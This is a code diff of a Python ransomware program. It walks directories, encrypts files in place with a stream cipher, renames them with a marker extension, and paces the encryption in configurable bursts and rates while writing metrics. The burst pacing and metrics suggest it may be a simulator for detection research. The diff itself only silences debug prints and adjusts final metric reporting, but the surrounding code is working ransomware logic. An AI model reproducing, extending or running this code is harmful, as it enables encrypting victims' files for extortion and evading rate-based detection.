@@ -144,9 +144,9 @@ def encrypt_file_inplace(file_name, crypto, total_files, burst_files, total_size
                          metric_time, block_size=16):
     """
     Open `filename` and encrypt according to `crypto`.
+
     :param file_name: a filename (preferably absolute path).
-    :param crypto: a stream cipher function that takes in a plaintext,
-            and returns a ciphertext of identical length.
+    :param crypto: a stream cipher function that takes in a plaintext, and returns a ciphertext of identical length.
     :param total_files: the total number of previously fully encrypted files (used solely in metrics reporting).
     :param burst_files: the number of files fully encrypted in current burst at time of calling this method
             (used solely in metrics reporting).
@@ -157,6 +157,7 @@ def encrypt_file_inplace(file_name, crypto, total_files, burst_files, total_size
     :param burst_start: the timestamp of when the current burst at time of calling this method had started.
     :param block_size: length of blocks to read and write.
     :param metric_time: timestamp when metrics were last written to report when limiting files per burst.
+
     :return: burst_files, burst_size, and burst_start for current burst at time of return.
     """
     with open(file_name, 'r+b') as f:
@@ -195,8 +196,8 @@ def encrypt_file_inplace(file_name, crypto, total_files, burst_files, total_size
                 # if r * d < s then r * (d + n) = s, thus n = s/r - d
                 subprocess.call('echo "{}" > ./{}'.format((burst_size / burst_duration), RATE_FILE), shell=True)
                 even_out = (burst_size / cfg_rate) - burst_duration
-                print("sleeping for {} to limit rate - r {} d {} s {}".format(
-                    "%.5f" % even_out, cfg_rate, "%.5f" % burst_duration, burst_size))
+                # print("sleeping for {} to limit rate - r {} d {} s {}".format(
+                #     "%.5f" % even_out, cfg_rate, "%.5f" % burst_duration, burst_size))
                 sleep(even_out)
             elif cfg_rate == 0:
                 subprocess.call('echo "{}" > ./{}'.format((burst_size / burst_duration), RATE_FILE), shell=True)
@@ -208,7 +209,7 @@ def encrypt_file_inplace(file_name, crypto, total_files, burst_files, total_size
             if cfg_duration > 0:  # bursts configured and duration is limited
                 if not limit_files:  # limit seconds instead of files
                     burst_duration = time() - burst_start
-                    print("bursting for", "%.3f" % burst_duration, "seconds")
+                    # print("bursting for", "%.3f" % burst_duration, "seconds")
                     if burst_duration >= cfg_duration:
                         stamp = time()
                         burst_duration = stamp - burst_start
@@ -217,10 +218,9 @@ def encrypt_file_inplace(file_name, crypto, total_files, burst_files, total_size
                                                     "%.3f" % burst_duration, cfg_pause, cfg_rate,
                                                     "%.3f" % (burst_size / burst_duration), config["GENERAL"]["algo"])
 
-                        print("sleeping for", cfg_pause)
+                        # print("sleeping for", cfg_pause)
                         sleep(cfg_pause)
 
-                        print("reset for seconds")
                         burst_files = 0
                         burst_size = 0
                         burst_start = time()
@@ -325,11 +325,14 @@ def encrypt_files(key, start_dirs):
     t_start = time()  # timestamp when ransomware encryption started
     b_start = t_start  # timestamp when current burst started
     metric_time = t_start  # timestamp when metrics were written to report
+    all_reported = True  # initially True for no files to report
 
     # Recursively go through folders and encrypt files
     for curr_dir in start_dirs:
         for file in discover_files(curr_dir):
             if not file.endswith(EXTENSION):
+                all_reported = False  # found new file
+
                 config = get_config_from_file()
                 cfg_rate = float(config["GENERAL"]["rate"])  # bytes per second
                 cfg_pause = int(config["BURST"]["pause"])  # seconds
@@ -347,8 +350,6 @@ def encrypt_files(key, start_dirs):
                     else:
                         raise e
 
-                print("after file", t_size, b_files, b_size, sep=" -- ")
-
                 encrypted_name = file + (flag if not extra else flag + "--" + extra) + EXTENSION
                 rename(file, encrypted_name)
                 # print("File changed from " + file + " to " + encrypted_name)  # keep!
@@ -358,7 +359,7 @@ def encrypt_files(key, start_dirs):
 
                 if cfg_duration > 0:  # bursts configured and duration is limited
                     if limit_files:
-                        print("bursting for", b_files, "files")
+                        # print("bursting for", b_files, "files")
                         if t_files >= cfg_duration:
                             stamp = time()
                             burst_duration = stamp - b_start
@@ -366,10 +367,10 @@ def encrypt_files(key, start_dirs):
                                                         cfg_duration, "%.3f" % burst_duration, cfg_pause, cfg_rate,
                                                         "%.3f" % (b_size / burst_duration), config["GENERAL"]["algo"])
 
-                            print("sleeping for", cfg_pause)
+                            # print("sleeping for", cfg_pause)
                             sleep(cfg_pause)
 
-                            print("reset for files")
+                            all_reported = True  # when final file and file limit
                             b_files = 0
                             b_size = 0
                             b_start = time()
@@ -380,27 +381,28 @@ def encrypt_files(key, start_dirs):
                         write_burst_metrics_to_file(t_files, t_files, t_size, t_size, "%.3f" % t_duration,
                                                     cfg_duration, "%.3f" % since_last_metric, cfg_pause, cfg_rate,
                                                     "%.3f" % (t_size / t_duration), config["GENERAL"]["algo"])
+                        all_reported = True  # when final file and 10s mark
                         metric_time = time()
 
     # report metrics one last time to ensure all metrics are included
-    config = get_config_from_file()
-    cfg_rate = float(config["GENERAL"]["rate"])  # bytes per second
-    cfg_pause = int(config["BURST"]["pause"])  # seconds
-    cfg_duration = int(config["BURST"]["duration"][1:])  # format examples: "s5" or "f30"
+    if not all_reported:
+        config = get_config_from_file()
+        cfg_rate = float(config["GENERAL"]["rate"])  # bytes per second
+        cfg_pause = int(config["BURST"]["pause"])  # seconds
+        cfg_duration = int(config["BURST"]["duration"][1:])  # format examples: "s5" or "f30"
 
-    print("final report, duration", cfg_duration > 0)
-    if cfg_duration > 0:  # bursts configured and duration is limited
-        stamp = time()
-        burst_duration = stamp - b_start
-        write_burst_metrics_to_file(t_files, b_files, t_size, b_size, "%.3f" % (stamp - t_start), cfg_duration,
-                                    "%.3f" % burst_duration, cfg_pause, cfg_rate, "%.3f" % (b_size / burst_duration),
-                                    config["GENERAL"]["algo"])
-    else:
-        since_last_metric = time() - metric_time
-        t_duration = time() - t_start
-        write_burst_metrics_to_file(t_files, t_files, t_size, t_size, "%.3f" % t_duration, cfg_duration,
-                                    "%.3f" % since_last_metric, cfg_pause, cfg_rate, "%.3f" % (t_size / t_duration),
-                                    config["GENERAL"]["algo"])
+        if cfg_duration > 0:  # bursts configured and duration is limited
+            stamp = time()
+            burst_duration = stamp - b_start
+            write_burst_metrics_to_file(t_files, b_files, t_size, b_size, "%.3f" % (stamp - t_start), cfg_duration,
+                                        "%.3f" % burst_duration, cfg_pause, cfg_rate,
+                                        "%.3f" % (b_size / burst_duration), config["GENERAL"]["algo"])
+        else:
+            since_last_metric = time() - metric_time
+            t_duration = time() - t_start
+            write_burst_metrics_to_file(t_files, t_files, t_size, t_size, "%.3f" % t_duration, cfg_duration,
+                                        "%.3f" % since_last_metric, cfg_pause, cfg_rate, "%.3f" % (t_size / t_duration),
+                                        config["GENERAL"]["algo"])
 
 
 def decrypt_files(key, start_dirs):
